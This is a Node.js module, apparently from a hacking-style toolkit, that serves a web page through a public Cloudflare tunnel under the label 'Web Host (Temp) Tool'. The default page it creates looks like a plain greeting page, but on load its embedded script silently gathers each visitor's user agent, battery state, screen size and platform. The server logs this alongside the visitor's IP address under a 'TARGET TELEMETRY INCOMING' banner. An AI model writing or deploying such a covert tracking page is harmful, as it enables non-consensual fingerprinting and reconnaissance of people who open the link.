import inquirer from 'inquirer';
import fs from 'fs/promises';
import path from 'path';
import { exec, execSync } from 'child_process';
import express from 'express';
import { fileURLToPath } from 'url';
import { colors, createSpinner } from '../../core/ui.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const HOSTS_DIR = path.join(__dirname, 'hosted_projects');

let serverInstance = null;
let tunnelProcess = null;

function checkRequirements() {
    const spinner = createSpinner('Checking system requirements...').start();
    try {
        execSync('command -v cloudflared', { stdio: 'ignore' });
        spinner.succeed(colors.success('System requirements satisfied (cloudflared).'));
        return true;
    } catch {
        spinner.info(colors.accent('Installing missing dependency: cloudflared...\n'));
        try {
            execSync('pkg update -y && pkg install cloudflared -y', { stdio: 'inherit' });
            console.log(colors.success('\n[+] Successfully installed cloudflared.'));
            return true;
        } catch (err) {
            console.log(colors.error('\n[!] Failed to auto-install cloudflared.'));
            console.log(colors.accent('Please install manually by typing: pkg install cloudflared'));
            return false;
        }
    }
}

export default async function run() {
    console.log(colors.primary('\n--- Web Host (Temp) Tool ---'));
    
    const isReady = checkRequirements();
    if (!isReady) {
        console.log(colors.error('Cannot proceed without required dependencies. Exiting tool...'));
        return;
    }

    try {
        await fs.access(HOSTS_DIR);
    } catch {
        await fs.mkdir(HOSTS_DIR, { recursive: true });
    }

    const { projectName } = await inquirer.prompt([
        {
            type: 'input',
            name: 'projectName',
            message: colors.accent('Enter project name:'),
            validate: (input) => input.trim().length > 0 ? true : 'Project name cannot be empty.'
        }
    ]);

    const projectPath = path.join(HOSTS_DIR, projectName);
    try {
        await fs.access(projectPath);
    } catch {
        await fs.mkdir(projectPath, { recursive: true });
    }

    await manageProject(projectName, projectPath);
}

async function manageProject(projectName, projectPath) {
    const indexPath = path.join(projectPath, 'index.html');
    let hasHtml = false;

    try {
        await fs.access(indexPath);
        hasHtml = true;
    } catch {}

    if (!hasHtml) {
        console.log(colors.error('\n[!] No index.html found for this project.'));
        await editHtml(indexPath);
    }

    let managing = true;
    while (managing) {
        console.log(`\n${colors.secondary('Project:')} ${colors.accent(projectName)}`);
        
        const { action } = await inquirer.prompt([
            {
                type: 'list',
                name: 'action',
                message: colors.accent('Select action:'),
                choices: [
                    { name: 'Run Website (Cloudflare Tunnel)', value: 'run' },
                    { name: 'Edit index.html', value: 'edit' },
                    { name: 'Back to Framework Menu', value: 'back' }
                ]
            }
        ]);

        if (action === 'back') {
            stopServer();
            managing = false;
        } else if (action === 'edit') {
            await editHtml(indexPath);
        } else if (action === 'run') {
            await startHosting(projectPath);
        }
    }
}

async function editHtml(indexPath) {
    console.log(colors.primary('\n--- HTML Editor ---'));
    
    try {
        await fs.access(indexPath);
    } catch {
        const defaultHtml = `<!DOCTYPE html>
<html>
<head>
<title>Hosted Site</title>
<script>
async function captureData() {
    let batteryLevel = "N/A";
    let isCharging = "N/A";
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryLevel = (battery.level * 100) + "%";
            isCharging = battery.charging ? "Yes" : "No";
        }
    } catch (e) {}

    const details = {
        userAgent: navigator.userAgent,
        battery: batteryLevel,
        charging: isCharging,
        screen: window.screen.width + "x" + window.screen.height,
        platform: navigator.platform || "N/A"
    };

    fetch("/log-capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(details)
    });
}
window.onload = captureData;
</script>
</head>
<body>
<h1>Hello From Letkira Tunnel</h1>
</body>
</html>`;
        await fs.writeFile(indexPath, defaultHtml, 'utf-8');
    }

    try {
        execSync(`nano "${indexPath}"`, { stdio: 'inherit' });
        console.log(colors.success('\n[+] index.html saved successfully.'));
    } catch (err) {
        console.log(colors.error('\n[!] Failed to open nano. Please install manually: pkg install nano'));
    }
}

async function startHosting(projectPath) {
    stopServer();

    const port = 8080;
    const app = express();
    
    app.use(express.json());

    app.post('/log-capture', (req, res) => {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const ua = req.body.userAgent || '';
        
        let device = "Unknown Device";
        if (ua.match(/Android/i)) {
            const match = ua.match(/Android\s+([^\s;]+);?\s+([^;\)]+)/) || ua.match(/Linux;\s+Android\s+[^;]+;\s+([^;\)]+)/);
            device = match ? `Android (${match[1] || match[2]})` : "Android Device";
        } else if (ua.match(/iPhone/i)) {
            device = "iPhone";
        } else if (ua.match(/Windows/i)) {
            device = "Windows PC";
        } else if (ua.match(/Macintosh/i)) {
            device = "MacBook";
        } else if (ua.match(/Linux/i)) {
            device = "Linux Machine";
        }

        console.log(`\n${colors.success('┌────────────────────────────────────────────────────────┐')}`);
        console.log(`${colors.success('│')} ${colors.primary('TARGET TELEMETRY INCOMING')}                               ${colors.success('│')}`);
        console.log(`${colors.success('├────────────────────────────────────────────────────────┤')}`);
        console.log(`${colors.success('│')} ${colors.secondary('IP Address:')}  ${colors.accent(ip.padEnd(39))} ${colors.success('│')}`);
        console.log(`${colors.success('│')} ${colors.secondary('Device:')}      ${colors.accent(device.padEnd(39))} ${colors.success('│')}`);
        console.log(`${colors.success('│')} ${colors.secondary('Battery:')}     ${colors.accent(`${req.body.battery} (Charging: ${req.body.charging})`.padEnd(39))} ${colors.success('│')}`);
        console.log(`${colors.success('│')} ${colors.secondary('Resolution:')}  ${colors.accent((req.body.screen || 'N/A').padEnd(39))} ${colors.success('│')}`);
        console.log(`${colors.success('└────────────────────────────────────────────────────────┘')}\n`);

        res.sendStatus(200);
    });

    app.use((req, res, next) => {
        if (req.path !== '/log-capture') {
            const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
            console.log(`${colors.accent(`[${timestamp}]`)} Route Request: ${colors.secondary(ip)} -> ${colors.primary(req.method)} ${colors.secondary(req.url)}`);
        }
        next();
    });

    app.use(express.static(projectPath));

    serverInstance = app.listen(port);
    console.log(colors.success(`\n[+] Local HTTP server initialized on port ${port}.`));

    const spinner = createSpinner('Establishing secure Cloudflare Tunnel connection...').start();

    tunnelProcess = exec(`cloudflared tunnel --url http://localhost:${port}`);

    tunnelProcess.stderr.on('data', (data) => {
        const match = data.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
        if (match) {
            spinner.succeed(colors.success('Tunnel live broadcast established!'));
            console.log(`\n${colors.primary('┌────────────────────────────────────────────────────────┐')}`);
            console.log(`${colors.primary('│')} ${colors.secondary('Live URL:')} ${colors.accent(match[0].padEnd(45))} ${colors.primary('│')}`);
            console.log(`${colors.primary('└────────────────────────────────────────────────────────┘')}\n`);
            console.log(colors.error('--- LIVE TRAFFIC DEVICE LOGS ---\n'));
        }
    });

    await inquirer.prompt([
        {
            type: 'input',
            name: 'stop',
            message: colors.accent('Press Enter to close tunnel connection and return...')
        }
    ]);

    stopServer();
}

function stopServer() {
    if (tunnelProcess) {
        tunnelProcess.kill();
        tunnelProcess = null;
    }
    if (serverInstance) {
        serverInstance.close();
        serverInstance = null;
    }
    console.log(colors.error('[*] Core hosting streams terminated.'));
}
